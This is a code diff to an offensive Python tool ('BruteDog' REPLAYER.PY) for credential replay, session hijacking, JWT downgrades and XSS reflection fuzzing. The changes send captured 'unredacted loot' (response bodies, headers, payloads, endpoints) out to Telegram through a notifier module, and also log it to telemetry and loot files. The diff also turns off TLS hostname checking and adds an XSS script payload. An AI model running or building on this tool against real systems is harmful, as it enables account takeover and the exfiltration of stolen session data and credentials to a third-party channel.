@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 """
-REPLAYER.PY — Adaptive Red-Team Credential Replay, Session Hijacking & Payload Mutation Engine
+REPLAYER.PY — Adaptive Red-Team Credential Replay, Session Hijacking & Payload Mutation Engine (With Telegram Telemetry)
 Features:
 - Stateful response-diffing to detect successful authentication anomalies
 - Dynamic payload mutation and context-aware injection fuzzing
 - Automated JWT algorithm downgrades and privilege escalation testing
 - Progressive colored terminal output & zero-disk memory processing
+- Real-time asynchronous Telegram notification dispatch for unredacted loot/findings
 """
 import asyncio
 import json
@@ -17,9 +18,14 @@ import urllib.parse
 import urllib.request
 from urllib.parse import urlsplit
 
+# Import centralized framework loot exfiltration, telemetry, and Telegram notifier
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
+from modules.telegram_notifier import send_telegram_alert
+
 TIMEOUT = 8
 MAX_ENDPOINTS = 8
-USER_AGENT = "BruteDog-AdaptiveReplayer/5.4"
+USER_AGENT = "BruteDog-AdaptiveReplayer/8.0"
 
 SSL_CONTEXT = ssl.create_default_context()
 SSL_CONTEXT.check_hostname = False
@@ -37,6 +43,17 @@ class Colors:
 
 def log(message, color=Colors.RESET):
     print(f"{color}{message}{Colors.RESET}", flush=True)
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous/asynchronous replayer functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 def normalize_target(target):
     if not target:
@@ -139,7 +156,6 @@ async def replay_secondary_attack_queue(target_domain):
 
                 response = await asyncio.to_thread(http_request, url, method="POST", data=payload)
                 
-                # Adaptive classification based on length deviation and status
                 body_len = len(response["body"])
                 is_bypass = response["status"] in (200, 201, 302) and (body_len > baseline_len * 1.5 or any(k in response["body"].lower() for k in ["token", "success", "session"]))
 
@@ -152,6 +168,24 @@ async def replay_secondary_attack_queue(target_domain):
                 if is_bypass:
                     log(f"\n[***] ADAPTIVE CREDENTIAL REPLAY SUCCESSFUL [{endpoint}] [***]", Colors.RED)
                     log(f"  └── Response Excerpt : {response['body'][:200]}", Colors.GREEN)
+                    
+                    loot_payload = {
+                        "endpoint": url,
+                        "status": response["status"],
+                        "payload": str(payload),
+                        "response_excerpt": response["body"][:300]
+                    }
+                    broadcast_tg_alert_sync("Credential Replay Success", loot_payload)
+                    stream_proof("CREDENTIAL_REPLAY_SUCCESS", endpoint, payload, response["body"][:300], loot_payload)
+                    save_session_loot(
+                        target=base_url,
+                        endpoint=endpoint,
+                        finding_type="CREDENTIAL_REPLAY_SUCCESS",
+                        status=response["status"],
+                        headers=response["headers"],
+                        body=response["body"],
+                        extra_loot=loot_payload
+                    )
                 else:
                     log(f"  └── HTTP {response['status']} | Length: {body_len} (Rejected)", Colors.GRAY)
 
@@ -198,6 +232,24 @@ async def replay_hijacked_session(target_domain):
             if is_success:
                 log(f"\n[***] PRIVILEGE ESCALATION BYPASS CONFIRMED [{path}] [***]", Colors.RED)
                 log(f"  └── Vector : {vector['name']}", Colors.GREEN)
+                
+                loot_payload = {
+                    "vector": vector["name"],
+                    "endpoint": url,
+                    "status": response["status"],
+                    "response_excerpt": response["body"][:300]
+                }
+                broadcast_tg_alert_sync(f"Replay Session Hijack ({vector['name']})", loot_payload)
+                stream_proof("REPLAY_SESSION_HIJACK", path, {"vector": vector["name"]}, response["body"][:300], loot_payload)
+                save_session_loot(
+                    target=base_url,
+                    endpoint=path,
+                    finding_type="REPLAY_SESSION_HIJACK_SUCCESS",
+                    status=response["status"],
+                    headers=response["headers"],
+                    body=response["body"],
+                    extra_loot=loot_payload
+                )
             else:
                 log(f"  └── {path} | HTTP {response['status']} (Blocked)", Colors.GRAY)
 
@@ -233,7 +285,24 @@ async def test_injection_reflection(target_domain):
             if reflected:
                 log(f"\n[***] PAYLOAD REFLECTION / XSS CONFIRMED [{path}] [***]", Colors.RED)
                 log(f"  └── Payload : {payload}", Colors.GREEN)
-                # Adaptive mutation: If reflection occurs, test context-breaking payload
+                
+                loot_payload = {
+                    "endpoint": url,
+                    "payload": payload,
+                    "status": response["status"]
+                }
+                broadcast_tg_alert_sync("Payload Reflection Confirmed", loot_payload)
+                stream_proof("PAYLOAD_REFLECTION", path, {"payload": payload}, response["body"][:300], loot_payload)
+                save_session_loot(
+                    target=base_url,
+                    endpoint=path,
+                    finding_type="PAYLOAD_REFLECTION_CONFIRMED",
+                    status=response["status"],
+                    headers=response["headers"],
+                    body=response["body"],
+                    extra_loot=loot_payload
+                )
+
                 mutated_payloads.append(f"\"><script>alert(document.domain)</script>")
 
             results.append({"endpoint": path, "payload": payload, "reflected": reflected})
